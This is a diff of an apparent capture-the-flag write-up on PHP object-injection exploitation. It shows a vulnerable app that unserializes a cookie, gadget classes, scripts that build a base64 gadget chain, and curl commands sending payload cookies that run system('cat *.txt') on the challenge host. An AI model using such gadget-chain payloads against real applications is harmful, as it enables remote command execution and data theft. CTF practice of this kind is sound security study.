@@ -14,11 +14,6 @@
 7
 8
 9
-```
-
-
-
-```
 <?php
 require("vendor/autoload.php");
 
@@ -28,11 +23,6 @@ if (isset($_COOKIE['cookie'])) {
 }
 
 echo "Welcome to my web app!";
-```
-
-
-
-```
 1
 2
 3
@@ -49,11 +39,6 @@ echo "Welcome to my web app!";
 14
 15
 16
-```
-
-
-
-```
 <?php
 
 namespace GadgetOne {
@@ -70,11 +55,6 @@ namespace GadgetOne {
  }
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -87,11 +67,6 @@ namespace GadgetOne {
 10
 11
 12
-```
-
-
-
-```
 <?php
 namespace GadgetTwo {
  class Echoers
@@ -104,11 +79,6 @@ namespace GadgetTwo {
  }
 
 }
-```
-
-
-
-```
 1
 2
 3
@@ -134,11 +104,6 @@ namespace GadgetTwo {
 23
 24
 25
-```
-
-
-
-```
 <?php
 
 namespace GadgetThree {
@@ -163,43 +128,18 @@ namespace GadgetThree {
  }
  }
 }
-```
-
-
-
-```
 1
-```
-
-
-
-```
 unserialize($cookie);
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Original
 echo $this->klass->get_x();
 
 # Plan
 echo $this->klass->Vuln();
-```
-
-
-
-```
 1
 2
 3
@@ -244,11 +184,6 @@ echo $this->klass->Vuln();
 42
 43
 44
-```
-
-
-
-```
 <?php
 require("vendor/autoload.php");
 
@@ -293,23 +228,9 @@ $serialized = serialize($echoers);
 echo base64_encode($serialized);
 
 echo "\n";
-```
-
-
-
-```
 1
-```
-
-
-
-```
-curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0="
-```
-
-
-
-```
+curl "http://ctf.tcp1p.com:
+45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0="
 1
 2
 3
@@ -324,11 +245,6 @@ curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOj
 12
 13
 14
-```
-
-
-
-```
 <?php
 require("vendor/autoload.php");
 
@@ -343,36 +259,23 @@ $property->setValue($gadgetTwo, $gadgetOne);
 $serializedGadgetTwo = serialize($gadgetTwo);
 
 echo(base64_encode($serializedGadgetTwo));
-```
-
-
-
-```
 1
-```
-
-
-
-```
-curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0="
-```
-
-
-
-```
+curl "http://ctf.tcp1p.com:
+45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0="
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Base64 Encoded Bbject
-TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=
+TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9u
+ZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChr
+YWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCks
+MjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8p
+LDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNj
+YW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=
 
 # Base64 Decoded Object
-O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
+O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:
+215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
 ```
